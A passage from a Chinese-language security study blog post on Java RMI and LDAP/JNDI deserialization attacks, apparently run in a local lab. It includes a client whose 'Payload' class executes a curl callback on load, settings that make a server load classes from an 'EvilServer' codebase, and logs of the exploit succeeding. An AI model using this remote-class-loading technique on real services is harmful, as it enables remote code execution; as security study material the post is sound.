class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Naming.rebind(<span class="string">&quot;creature&quot;</span>, <span class="keyword">new</span> <span class="title class_">CatImpl</span>());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CreatureInterface.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CreatureInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">eat</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    Integer <span class="title function_">calc</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CatImpl.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CatImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">CreatureInterface</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">CatImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;miao&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">eat</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">calc</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// policy </span></span><br><span class="line">grant &#123; permission java.security.AllPermission; &#125;;</span><br></pre></td></tr></table></figure>
+<p>设置<strong>Idea</strong>的<strong>vm option</strong>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.hostname=127.0.0.1 -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=/Users/south/Code/Java/Server/policy</span><br></pre></td></tr></table></figure>
+<h5 id="client">Client</h5>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RMIClient.java</span></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CreatureInterface</span> <span class="variable">c</span> <span class="operator">=</span> (CreatureInterface) Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/creature&quot;</span>);</span><br><span class="line">            List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">            li.add(<span class="number">3</span>);</span><br><span class="line">            li.add(<span class="number">4</span>);</span><br><span class="line">            System.out.println(c.calc(li));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;curl http://127.0.0.1:2333/payload&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CreatureInterface.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CreatureInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    </span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">eat</span><span class="params">(Object object)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line"></span><br><span class="line">    Integer <span class="title function_">calc</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>设置<strong>Idea</strong>的<strong>vm option</strong>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.rmi.server.codebase=http://127.0.0.1:23333/</span><br></pre></td></tr></table></figure>
+<h5 id="evilserver">EvilServer</h5>
+<p>将<strong>client</strong>下编译好的<strong>payload.class</strong>放在其他目录下，然后启一个<strong>web</strong>服务。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 23333</span><br></pre></td></tr></table></figure>
+<h5 id="结果">结果</h5>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ListenServer</span></span><br><span class="line">python -m http.server 2333</span><br><span class="line">Serving HTTP on :: port 2333 (http://[::]:2333/) ...</span><br><span class="line">::ffff:127.0.0.1 - - [07/Jun/2022 23:43:20] code 404, message File not found</span><br><span class="line">::ffff:127.0.0.1 - - [07/Jun/2022 23:43:20] <span class="string">&quot;GET /payload HTTP/1.1&quot;</span> 404 -</span><br><span class="line">::ffff:127.0.0.1 - - [07/Jun/2022 23:43:20] code 404, message File not found</span><br><span class="line">::ffff:127.0.0.1 - - [07/Jun/2022 23:43:20] <span class="string">&quot;GET /payload HTTP/1.1&quot;</span> 404 -</span><br><span class="line"></span><br><span class="line"><span class="comment"># EvilServer</span></span><br><span class="line">python -m http.server 23333</span><br><span class="line">Serving HTTP on :: port 23333 (http://[::]:23333/) ...</span><br><span class="line">::ffff:127.0.0.1 - - [07/Jun/2022 23:43:20] <span class="string">&quot;GET /Payload.class HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+<p>以上是通过<strong>Client</strong>攻击<strong>Server</strong>的示例，当然<strong>Server</strong>也可这般攻击<strong>Client</strong>，但攻击条件苛刻，因此只是做个了解。</p>
+<h2 id="ldap">LDAP</h2>
+<p>全称为<strong>Lightweight Directory Access
+Protocol</strong>，是基于<strong>X.500
+DAP</strong>【目录访问协议】的，但轻量且可定制，支持<strong>TCP/IP</strong>，定义在<strong><a
+target="_blank" rel="noopener" href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251</a>/<a
+target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511</a></strong>中。</p>
+<p>是一种有层次的树形结构，因此有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p>
+<p>是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</p>
+<p><strong>LDAP</strong>目录服务是由目录数据库和一套访问协议组成的系统。</p>
+<p><strong>Java</strong>对象在<strong>LDAP</strong>目录中也有多种存储形式：</p>
+<ul>
+<li><strong>Java</strong>序列化</li>
+<li><strong>JNDI Reference</strong></li>
+<li><strong>Marshalled</strong>对象</li>
+<li><strong>Remote Location</strong>【已弃用</li>
+</ul>
+<p><strong>LDAP</strong>可以为存储的<strong>Java</strong>对象指定多种属性：</p>
+<ul>
+<li><strong>javaCodeBase</strong></li>
+<li><strong>objectClass</strong></li>
+<li><strong>javaFactory</strong></li>
+<li><strong>javaSerializedData</strong></li>
+<li><strong>……</strong></li>
+</ul>
+<figure>
+<img src="/images/Study-Unserialize-Java/webp" alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Server</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPSeriServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                port,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line">            config.setSchema(<span class="literal">null</span>);</span><br><span class="line">            config.setEnforceAttributeSyntaxCompliance(<span class="literal">false</span>);</span><br><span class="line">            config.setEnforceSingleStructuralObjectClass(<span class="literal">false</span>);</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            ds.add(<span class="string">&quot;dn: &quot;</span> + <span class="string">&quot;dc=example,dc=com&quot;</span>, <span class="string">&quot;objectClass: top&quot;</span>, <span class="string">&quot;objectclass: domain&quot;</span>);</span><br><span class="line">            ds.add(<span class="string">&quot;dn: &quot;</span> + <span class="string">&quot;ou=employees,dc=example,dc=com&quot;</span>, <span class="string">&quot;objectClass: organizationalUnit&quot;</span>, <span class="string">&quot;objectClass: top&quot;</span>);</span><br><span class="line">            ds.add(<span class="string">&quot;dn: &quot;</span> + <span class="string">&quot;uid=longofo,ou=employees,dc=example,dc=com&quot;</span>, <span class="string">&quot;objectClass: ExportObject&quot;</span>);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPClient1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span>  ctx.lookup(<span class="string">&quot;ldap://127.0.0.1:1389/uid=longofo,ou=employees,dc=example,dc=com&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="reference">Reference</h1>
+<p><a
+target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512">反射
+- 廖雪峰的官方网站</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://www.cnblogs.com/noKing/p/9038234.html">Java反射-修改字段值,
+反射修改static final修饰的字段</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/312/">深入理解 JAVA
+反序列化漏洞</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">Java序列化的协议文档</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://thonsun.github.io/2020/12/04/rmi-li-yong-fen-xi">JavaSec
+rmi利用分析</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://goodapple.top/archives/520">Java安全学习——利用RMI进行攻击</a></p>
+<p><a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1522">浅谈 Java RMI</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/">Java RMI
+攻击由浅入深</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+              <a href="/tags/Java/" rel="tag"><i class="fa fa-tag"></i> Java</a>
+              <a href="/tags/Unserialize/" rel="tag"><i class="fa fa-tag"></i> Unserialize</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020-GACTF/" rel="prev" title="2020 GACTF 部分题解">
+                  <i class="fa fa-chevron-left"></i> 2020 GACTF 部分题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Study-Java-IO/" rel="next" title="复习Java的IO相关">
+                  复习Java的IO相关 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    
+  <div class="comments disqusjs-container">
+    <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+  </div>
+  
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  &copy; 2018 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">南溟NaN</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css" integrity="sha256-71XarXwNr1Td27HmZI9zjY+rMzRdush6/glo6VFXp7o=" crossorigin="anonymous">
+
+<script class="next-config" data-name="disqusjs" type="application/json">{"enable":true,"api":"https://disqus.skk.moe/disqus/","apikey":"Cz7uQCDoGwWYGv80HeDq40mZr1rrmYy9tHhCpcWG95DFzOD1TJKLXtbTxFqWBCr5","shortname":"southseast","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/disqusjs/3.0.2/disqusjs.es2015.umd.min.js","integrity":"sha256-okP99ZQKVpIy7+NogAMpGlIQzJa9XKXhIJcFgdju5bU="}}</script>
+<script src="/js/third-party/comments/disqusjs.js"></script>
+
+</body>
+</html>
